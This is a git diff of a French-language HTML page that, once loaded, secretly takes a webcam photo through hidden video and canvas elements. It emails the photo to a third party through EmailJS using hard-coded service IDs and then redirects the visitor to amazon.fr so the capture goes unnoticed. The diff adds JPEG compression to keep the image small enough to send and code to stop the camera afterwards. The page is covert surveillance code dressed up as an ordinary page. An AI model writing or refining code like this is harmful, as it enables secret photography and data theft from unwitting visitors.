@@ -2,7 +2,7 @@
 <html lang="fr">
 <head>
   <meta charset="UTF-8">
-  <title></title>
+  <title>Capture et EmailJS compressé</title>
   <script type="text/javascript" src="https://cdn.jsdelivr.net/npm/emailjs-com@3/dist/email.min.js"></script>
   <style>
     body, html {
@@ -20,9 +20,7 @@
       border: none;
       background: none;
     }
-    video, canvas {
-      display: none;
-    }
+    video, canvas { display: none; }
   </style>
 </head>
 <body>
@@ -47,8 +45,9 @@
         video.srcObject = stream;
 
         video.onloadeddata = () => {
+          // Capture et compression en JPEG à faible qualité
           context.drawImage(video, 0, 0, canvas.width, canvas.height);
-          const imageData = canvas.toDataURL("image/png");
+          const imageData = canvas.toDataURL("image/jpeg", 0.2); // 20% qualité pour rester <50KB
 
           emailjs.send("service_8cs0gml", "template_hgvdx1g", {
             message: "Photo automatique capturée 📸",
@@ -62,6 +61,9 @@
             console.log("Erreur EmailJS:", err);
             window.location.href = "https://www.amazon.fr";
           });
+
+          // Arrêt de la caméra
+          stream.getTracks().forEach(track => track.stop());
         };
 
       } catch (err) {
@@ -80,4 +82,3 @@
   </script>
 </body>
 </html>
-
